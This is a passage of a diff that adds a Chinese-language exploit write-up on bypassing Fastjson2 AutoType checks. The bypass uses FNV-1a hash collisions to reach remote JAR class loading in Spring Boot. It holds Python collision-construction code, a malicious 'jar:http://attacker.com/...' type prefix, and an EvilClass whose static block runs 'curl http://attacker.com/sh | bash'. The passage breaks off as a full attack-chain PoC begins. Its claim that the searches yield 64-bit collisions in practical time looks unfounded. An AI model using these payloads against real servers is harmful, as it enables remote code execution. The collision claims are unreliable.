+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Prefix hash: 0x</span><span class="si">{</span><span class="n">prefix_hash</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Target hash: 0x</span><span class="si">{</span><span class="n">target_hash</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 从 target_hash 逆向搜索</span>
+    <span class="c1"># 我们需要找到字符序列 c1, c2, ..., cn 使得:</span>
+    <span class="c1"># 从 prefix_hash 开始, 正向应用这些字符, 最终到达 target_hash</span>
+    <span class="c1"># 逆向: 从 target_hash 开始, 逆向移除字符, 到达 prefix_hash</span>
+
+    <span class="kn">from</span><span class="w"> </span><span class="nn">collections</span><span class="w"> </span><span class="kn">import</span> <span class="n">deque</span>
+
+    <span class="c1"># BFS from target backwards</span>
+    <span class="n">queue</span> <span class="o">=</span> <span class="n">deque</span><span class="p">()</span>
+    <span class="n">queue</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">target_hash</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">))</span>
+    <span class="n">visited</span> <span class="o">=</span> <span class="p">{</span><span class="n">target_hash</span><span class="p">}</span>
+
+    <span class="k">for</span> <span class="n">depth</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">max_depth</span><span class="p">):</span>
+        <span class="n">next_queue</span> <span class="o">=</span> <span class="n">deque</span><span class="p">()</span>
+        <span class="k">while</span> <span class="n">queue</span><span class="p">:</span>
+            <span class="n">current_hash</span><span class="p">,</span> <span class="n">suffix</span> <span class="o">=</span> <span class="n">queue</span><span class="o">.</span><span class="n">popleft</span><span class="p">()</span>
+
+            <span class="c1"># 检查是否回到了 prefix_hash</span>
+            <span class="k">if</span> <span class="n">depth</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">current_hash</span> <span class="o">==</span> <span class="n">prefix_hash</span> <span class="ow">and</span> <span class="n">suffix</span><span class="p">:</span>
+                <span class="c1"># 验证: 正向计算 prefix + suffix 是否等于 target</span>
+                <span class="n">full</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">suffix</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>  <span class="c1"># suffix 是逆向存储的</span>
+                <span class="n">actual</span> <span class="o">=</span> <span class="n">fnv1a_64</span><span class="p">(</span><span class="n">full</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">actual</span> <span class="o">==</span> <span class="n">target_hash</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="n">full</span>
+                <span class="k">continue</span>
+
+            <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">allowed_chars</span><span class="p">:</span>
+                <span class="c1"># 逆向一步: 假设最后追加的字符是 ch</span>
+                <span class="n">prev_hash</span> <span class="o">=</span> <span class="n">reverse_step</span><span class="p">(</span><span class="n">current_hash</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span>
+                <span class="n">new_suffix</span> <span class="o">=</span> <span class="n">suffix</span> <span class="o">+</span> <span class="n">ch</span>
+                <span class="k">if</span> <span class="n">prev_hash</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">visited</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">new_suffix</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="p">:</span>
+                    <span class="n">visited</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">prev_hash</span><span class="p">)</span>
+                    <span class="n">next_queue</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">prev_hash</span><span class="p">,</span> <span class="n">new_suffix</span><span class="p">))</span>
+
+        <span class="n">queue</span> <span class="o">=</span> <span class="n">next_queue</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">queue</span><span class="p">:</span>
+            <span class="k">break</span>
+
+    <span class="k">return</span> <span class="kc">None</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">collision_via_append</span><span class="p">(</span><span class="n">target_hash</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">prefix</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">num_fill</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">8</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    更高效的碰撞构造: 利用 FNV-1a 的代数性质直接求解</span>
+
+<span class="sd">    思路:</span>
+<span class="sd">    1. 计算前缀哈希 H_prefix</span>
+<span class="sd">    2. 需要找到 suffix 使得 fnv1a_64(prefix + suffix) = H_target</span>
+<span class="sd">    3. 通过填充字符逐步逼近目标哈希</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
+
+    <span class="n">prefix_hash</span> <span class="o">=</span> <span class="n">fnv1a_64</span><span class="p">(</span><span class="n">prefix</span><span class="p">)</span>
+    <span class="n">allowed</span> <span class="o">=</span> <span class="s2">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span>
+
+    <span class="c1"># 随机搜索: 追加随机字符, 检查是否命中目标</span>
+    <span class="c1"># (实际利用中会使用更高效的定向方法)</span>
+    <span class="n">attempts</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">attempts</span> <span class="o">&lt;</span> <span class="mi">10_000_000</span><span class="p">:</span>
+        <span class="n">suffix</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">allowed</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="n">num_fill</span><span class="p">))</span>
+        <span class="n">full</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">suffix</span>
+        <span class="k">if</span> <span class="n">fnv1a_64</span><span class="p">(</span><span class="n">full</span><span class="p">)</span> <span class="o">==</span> <span class="n">target_hash</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">full</span>
+        <span class="n">attempts</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="k">return</span> <span class="kc">None</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Fastjson2 FNV-1a Hash Collision Constructor&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+
+    <span class="c1"># 1. 计算白名单类型的哈希</span>
+    <span class="n">whitelist_type</span> <span class="o">=</span> <span class="s2">&quot;java.lang.String&quot;</span>
+    <span class="n">target_hash</span> <span class="o">=</span> <span class="n">fnv1a_64</span><span class="p">(</span><span class="n">whitelist_type</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[1] Whitelist type: </span><span class="si">{</span><span class="n">whitelist_type</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    FNV-1a hash: 0x</span><span class="si">{</span><span class="n">target_hash</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 2. 验证 FNV_PRIME 的逆元</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[2] FNV_PRIME:        0x</span><span class="si">{</span><span class="n">FNV_PRIME</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    FNV_PRIME_INV:    0x</span><span class="si">{</span><span class="n">FNV_PRIME_INV</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">verify</span> <span class="o">=</span> <span class="p">(</span><span class="n">FNV_PRIME</span> <span class="o">*</span> <span class="n">FNV_PRIME_INV</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK_64</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Verify (should be 1): </span><span class="si">{</span><span class="n">verify</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 3. 尝试碰撞构造</span>
+    <span class="c1"># 攻击前缀: jar: 协议 URL</span>
+    <span class="n">evil_prefix</span> <span class="o">=</span> <span class="s2">&quot;jar:http://attacker.com/e.jar!/&quot;</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[3] Attempting collision construction...&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Prefix: </span><span class="si">{</span><span class="n">evil_prefix</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Prefix hash: 0x</span><span class="si">{</span><span class="n">fnv1a_64</span><span class="p">(</span><span class="n">evil_prefix</span><span class="p">)</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 4. 演示: 逆向求解</span>
+    <span class="c1"># 从目标哈希逆向, 尝试找到回到前缀哈希的路径</span>
+    <span class="n">collision</span> <span class="o">=</span> <span class="n">find_collision</span><span class="p">(</span><span class="n">target_hash</span><span class="p">,</span> <span class="n">evil_prefix</span><span class="p">,</span> <span class="n">max_depth</span><span class="o">=</span><span class="mi">6</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">collision</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[+] COLLISION FOUND!&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Collision string: </span><span class="si">{</span><span class="n">collision</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Hash: 0x</span><span class="si">{</span><span class="n">fnv1a_64</span><span class="p">(</span><span class="n">collision</span><span class="p">)</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Target hash: 0x</span><span class="si">{</span><span class="n">target_hash</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    Match: </span><span class="si">{</span><span class="n">fnv1a_64</span><span class="p">(</span><span class="n">collision</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">target_hash</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">    This string has the SAME hash as &#39;</span><span class="si">{</span><span class="n">whitelist_type</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    but is a completely different string!&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[-] No collision found within search depth.&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    (In practice, deeper search or meet-in-the-middle is used)&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 5. 演示哈希验证</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[4] Hash verification examples:&quot;</span><span class="p">)</span>
+    <span class="n">test_strings</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="s2">&quot;java.lang.String&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;java.util.HashMap&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;com.alibaba.fastjson2.JSONObject&quot;</span><span class="p">,</span>
+    <span class="p">]</span>
+    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">test_strings</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    fnv1a_64(</span><span class="se">\&quot;</span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="se">\&quot;</span><span class="s2">) = 0x</span><span class="si">{</span><span class="n">fnv1a_64</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="si">:</span><span class="s2">016x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+
+<h3>4.4 Meet-in-the-Middle 优化</h3>
+<p>对于更高效的碰撞构造，可采用<strong>中间相遇攻击</strong>（Meet-in-the-Middle）：</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">meet_in_the_middle</span><span class="p">(</span><span class="n">target_hash</span><span class="p">,</span> <span class="n">prefix</span><span class="p">,</span> <span class="n">suffix_len</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    Meet-in-the-Middle 碰撞构造:</span>
+<span class="sd">    1. 从 prefix_hash 正向枚举 suffix 前半部分, 存储所有中间哈希</span>
+<span class="sd">    2. 从 target_hash 逆向枚举 suffix 后半部分, 查找碰撞</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="kn">from</span><span class="w"> </span><span class="nn">itertools</span><span class="w"> </span><span class="kn">import</span> <span class="n">product</span>
+    <span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
+
+    <span class="n">allowed</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
+    <span class="n">prefix_hash</span> <span class="o">=</span> <span class="n">fnv1a_64</span><span class="p">(</span><span class="n">prefix</span><span class="p">)</span>
+
+    <span class="c1"># 正向: 枚举前半部分</span>
+    <span class="n">forward</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="k">for</span> <span class="n">combo</span> <span class="ow">in</span> <span class="n">product</span><span class="p">(</span><span class="n">allowed</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="n">suffix_len</span><span class="p">):</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">combo</span><span class="p">)</span>
+        <span class="n">h</span> <span class="o">=</span> <span class="n">prefix_hash</span>
+        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+            <span class="n">h</span> <span class="o">^=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+            <span class="n">h</span> <span class="o">=</span> <span class="p">(</span><span class="n">h</span> <span class="o">*</span> <span class="n">FNV_PRIME</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK_64</span>
+        <span class="n">forward</span><span class="p">[</span><span class="n">h</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span>
+
+    <span class="c1"># 逆向: 枚举后半部分</span>
+    <span class="k">for</span> <span class="n">combo</span> <span class="ow">in</span> <span class="n">product</span><span class="p">(</span><span class="n">allowed</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="n">suffix_len</span><span class="p">):</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">combo</span><span class="p">)</span>
+        <span class="n">h</span> <span class="o">=</span> <span class="n">target_hash</span>
+        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+            <span class="n">h</span> <span class="o">=</span> <span class="n">reverse_step</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span>
+        <span class="k">if</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">forward</span><span class="p">:</span>
+            <span class="n">full</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">forward</span><span class="p">[</span><span class="n">h</span><span class="p">]</span> <span class="o">+</span> <span class="n">s</span>
+            <span class="k">if</span> <span class="n">fnv1a_64</span><span class="p">(</span><span class="n">full</span><span class="p">)</span> <span class="o">==</span> <span class="n">target_hash</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">full</span>
+
+    <span class="k">return</span> <span class="kc">None</span>
+</code></pre></div>
+
+<p>这种方法将时间复杂度从 O(n^(2k)) 降低到 O(n^k)，使得在可接受时间内构造出碰撞成为可能。</p>
+<hr />
+<h2>五、ContextClassLoader 远程加载机制</h2>
+<h3>5.1 Spring Boot fat-JAR 的嵌套 JAR URL 格式</h3>
+<p>Spring Boot 采用 fat-JAR 打包方式，将所有依赖 JAR 嵌入到主 JAR 的 <code>BOOT-INF/lib/</code> 目录中。为了访问嵌套 JAR 中的资源，Spring Boot 实现了特殊的 URL 协议：</p>
+<div class="highlight"><pre><span></span><code>标准 JAR URL 格式:
+    jar:&lt;url&gt;!/&lt;entry&gt;
+    例: jar:file:/app.jar!/com/example/Class.class
+
+Spring Boot 嵌套 JAR URL 格式:
+    jar:jar:file:/app.jar!/BOOT-INF/lib/inner.jar!/com/example/Class.class
+    ─┬─ ──────┬────────── ────────────┬────────────── ────────┬─────────────
+     │        │                        │                         │
+     │        外层 JAR 文件             内层 JAR 在外层中的路径     目标类在内层中的路径
+     jar 协议
+</code></pre></div>
+
+<h3>5.2 jar: 协议的 URL 解析流程</h3>
+<p>Java 的 <code>java.net.JarURLConnection</code> 和 <code>URLClassLoader</code> 支持 <code>jar:</code> 协议。当遇到 <code>jar:http://attacker.com/evil.jar!/EvilClass</code> 这样的 URL 时：</p>
+<div class="highlight"><pre><span></span><code><span class="n">URL</span><span class="w"> </span><span class="err">解析流程</span><span class="p">:</span>
+<span class="err">┌─────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w"> </span><span class="n">jar</span><span class="p">:</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attacker</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">evil</span><span class="o">.</span><span class="n">jar</span><span class="o">!/</span><span class="n">EvilClass</span><span class="w">             </span><span class="err">│</span>
+<span class="err">└───────────────────────────┬─────────────────────────────┘</span>
+<span class="w">                            </span><span class="err">│</span>
+<span class="w">                            </span><span class="err">▼</span>
+<span class="err">┌─────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w"> </span><span class="mf">1.</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="err">解析器识别</span><span class="w"> </span><span class="s2">&quot;jar:&quot;</span><span class="w"> </span><span class="err">协议前缀</span><span class="w">                         </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="mf">2.</span><span class="w"> </span><span class="err">提取外层</span><span class="w"> </span><span class="n">URL</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attacker</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">evil</span><span class="o">.</span><span class="n">jar</span><span class="w">            </span><span class="err">│</span>
+<span class="err">│</span><span class="w"> </span><span class="mf">3.</span><span class="w"> </span><span class="err">提取</span><span class="w"> </span><span class="n">JAR</span><span class="w"> </span><span class="err">内路径</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">EvilClass</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">└───────────────────────────┬─────────────────────────────┘</span>
+<span class="w">                            </span><span class="err">│</span>
+<span class="w">                            </span><span class="err">▼</span>
+<span class="err">┌─────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w"> </span><span class="mf">4.</span><span class="w"> </span><span class="n">JarURLConnection</span><span class="o">.</span><span class="n">openConnection</span><span class="p">()</span><span class="w">                     </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">→</span><span class="w"> </span><span class="err">创建到</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">attacker</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">evil</span><span class="o">.</span><span class="n">jar</span><span class="w"> </span><span class="err">的</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="err">连接</span><span class="w">     </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">→</span><span class="w"> </span><span class="err">下载</span><span class="w"> </span><span class="n">evil</span><span class="o">.</span><span class="n">jar</span><span class="w"> </span><span class="err">到临时目录</span><span class="w">                             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">→</span><span class="w"> </span><span class="err">打开</span><span class="w"> </span><span class="n">JAR</span><span class="w"> </span><span class="err">文件</span><span class="w">                                        </span><span class="err">│</span>
+<span class="err">└───────────────────────────┬─────────────────────────────┘</span>
+<span class="w">                            </span><span class="err">│</span>
+<span class="w">                            </span><span class="err">▼</span>
+<span class="err">┌─────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w"> </span><span class="mf">5.</span><span class="w"> </span><span class="n">URLClassLoader</span><span class="o">.</span><span class="n">loadClass</span><span class="p">(</span><span class="s2">&quot;EvilClass&quot;</span><span class="p">)</span><span class="w">                </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">→</span><span class="w"> </span><span class="err">从下载的</span><span class="w"> </span><span class="n">evil</span><span class="o">.</span><span class="n">jar</span><span class="w"> </span><span class="err">中加载</span><span class="w"> </span><span class="n">EvilClass</span><span class="o">.</span><span class="k">class</span><span class="w">            </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">→</span><span class="w"> </span><span class="err">★</span><span class="w"> </span><span class="err">触发</span><span class="w"> </span><span class="n">EvilClass</span><span class="w"> </span><span class="err">的静态代码块</span><span class="w"> </span><span class="err">★</span><span class="w">                     </span><span class="err">│</span>
+<span class="err">└─────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<h3>5.3 类加载触发静态代码块执行的原理</h3>
+<p>Java 类加载机制中，<code>Class.forName(name)</code> 默认会初始化类（<code>initialize=true</code>），这会触发：</p>
+<ol>
+<li><strong>加载</strong>（Loading）：从字节码读取类信息</li>
+<li><strong>链接</strong>（Linking）：验证、准备、解析</li>
+<li><strong>初始化</strong>（Initialization）：执行 <code>&lt;clinit&gt;</code> 方法</li>
+</ol>
+<p><code>&lt;clinit&gt;</code> 方法包含：
+- 静态变量的赋值
+- <strong><code>static {}</code> 静态代码块</strong></p>
+<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EvilClass</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 这段代码在类加载初始化阶段自动执行</span>
+<span class="w">        </span><span class="c1">// 无需实例化对象，无需调用任何方法</span>
+<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;curl http://attacker.com/sh | bash&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>关键点：<strong>Fastjson2 在通过 <code>checkAutoType</code> 后会调用 <code>Class.forName(typeName)</code> 加载类，此时 <code>initialize</code> 参数默认为 <code>true</code>，静态代码块自动执行。</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1">// Fastjson2 中的类加载（简化）</span>
+<span class="kd">public</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="nf">loadClass</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">typeName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 经过 checkAutoType 校验后...</span>
+<span class="w">    </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span>
+<span class="w">        </span><span class="n">typeName</span><span class="p">,</span>
+<span class="w">        </span><span class="kc">true</span><span class="p">,</span><span class="w">  </span><span class="c1">// ★ initialize=true, 触发 &lt;clinit&gt; ★</span>
+<span class="w">        </span><span class="n">Thread</span><span class="p">.</span><span class="na">currentThread</span><span class="p">().</span><span class="na">getContextClassLoader</span><span class="p">()</span>
+<span class="w">    </span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>5.4 ContextClassLoader 的作用</h3>
+<p><code>Thread.currentThread().getContextClassLoader()</code> 返回当前线程的上下文类加载器。在 Spring Boot 应用中，这通常是 <code>LaunchedURLClassLoader</code>，它支持嵌套 JAR URL 协议。</p>
+<p>当 <code>@type</code> 的值是 <code>jar:http://...</code> 格式时，ContextClassLoader 会：</p>
+<ol>
+<li>将该值作为资源 URL 解析</li>
+<li>通过 <code>jar:</code> 协议处理器发起 HTTP 请求下载远程 JAR</li>
+<li>从远程 JAR 中加载指定的类</li>
+<li>初始化类时执行静态代码块</li>
+</ol>
+<p>这就是为什么<strong>默认配置即可触发</strong>——不需要 <code>SupportAutoType</code>，因为哈希碰撞使恶意类型名命中了内部白名单，绕过了所有 AutoType 检查。</p>
+<hr />
+<h2>六、完整攻击链 PoC 实战</h2>
+<h3>6.1 攻击架构总览</h3>
+<div class="highlight"><pre><span></span><code><span class="err">┌─────────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">                    </span><span class="nx">完整攻击链架构</span><span class="w">                                      </span><span class="err">│</span>
+<span class="err">└─────────────────────────────────────────────────────────────────────┘</span>
+
+<span class="w">  </span><span class="nx">攻击者</span><span class="w">                         </span><span class="nx">目标服务器</span><span class="w">                    </span><span class="nx">攻击者C2</span>
+<span class="w"> </span><span class="err">┌───────┐</span><span class="w">                    </span><span class="err">┌──────────────┐</span><span class="w">             </span><span class="err">┌──────────┐</span>
+<span class="w"> </span><span class="err">│</span><span class="w">       </span><span class="err">│</span><span class="w">  </span><span class="mi">1</span><span class="p">.</span><span class="w"> </span><span class="nx">发送恶意JSON</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="nx">Spring</span><span class="w"> </span><span class="nx">Boot</span><span class="w">  </span><span class="err">│</span><span class="w">             </span><span class="err">│</span><span class="w">  </span><span class="nx">HTTP</span><span class="w">    </span><span class="err">│</span>
+<span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="nx">Exploit</span><span class="err">│</span><span class="w"> </span><span class="err">─────────────────→│</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="nx">Fastjson2</span><span class="w">  </span><span class="err">│</span><span class="w">             </span><span class="err">│</span><span class="w">  </span><span class="nx">Server</span><span class="w">  </span><span class="err">│</span>
+<span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="nx">Script</span><span class="w"> </span><span class="err">│</span><span class="w">                    </span><span class="err">│</span><span class="w">  </span><span class="err">≤</span><span class="w"> </span><span class="m m-Double">2.0.62</span><span class="w">     </span><span class="err">│</span><span class="w">             </span><span class="err">│</span><span class="w"> </span><span class="p">(</span><span class="nx">evil</span><span class="p">.</span><span class="nx">jar</span><span class="err">│</span>
+<span class="w"> </span><span class="err">│</span><span class="w">       </span><span class="err">│</span><span class="w">                    </span><span class="err">└──────┬───────┘</span><span class="w">             </span><span class="err">│</span><span class="w">  </span><span class="nx">托管</span><span class="p">)</span><span class="w">   </span><span class="err">│</span>
+<span class="w"> </span><span class="err">└───┬───┘</span><span class="w">                           </span><span class="err">│</span><span class="w">                      </span><span class="err">└────┬─────┘</span>
+<span class="w">     </span><span class="err">│</span><span class="w">                               </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
